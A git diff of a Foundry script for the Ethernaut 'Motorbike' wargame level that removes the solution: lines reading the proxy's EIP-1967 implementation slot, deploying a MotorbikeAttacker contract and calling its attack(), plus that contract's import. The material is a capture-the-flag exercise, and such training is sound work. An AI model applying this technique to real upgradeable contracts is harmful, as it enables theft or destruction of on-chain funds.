@@ -5,7 +5,7 @@ import {Script, console2} from "forge-std/Script.sol";
 import {EthernautHelper} from "../setup/EthernautHelper.sol";
 
 // NOTE You can import your helper contracts & create interfaces here
-import "../../src/25-MotorbikeAttacker.sol";
+//  import "../../src/25-MotorbikeAttacker.sol";
 
 contract MotorbikeSolution is Script, EthernautHelper {
     address constant LEVEL_ADDRESS = 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6;
@@ -21,9 +21,6 @@ contract MotorbikeSolution is Script, EthernautHelper {
         //Engine: 0x9c4CB32C441F89560997738062645F56FD7a112f
 
         // YOUR SOLUTION HERE
-        address engine = address(uint160(uint256(vm.load(challengeInstance, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc))));
-        MotorbikeAttacker motorbikeAttacker = new MotorbikeAttacker(engine);
-        motorbikeAttacker.attack();
        
         // SUBMIT CHALLENGE. (DON'T EDIT)
         bool levelSuccess = submitInstance(challengeInstance);
@@ -45,9 +42,6 @@ contract MotorbikeSolution is Script, EthernautHelper {
         console2.log("challengeInstanceOnChain:", challengeInstance);
 
         // YOUR SOLUTION HERE
-        address engine = address(uint160(uint256(vm.load(challengeInstance, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc))));
-        MotorbikeAttacker motorbikeAttacker = new MotorbikeAttacker(engine);
-        motorbikeAttacker.attack();
 
         vm.stopBroadcast();
     }
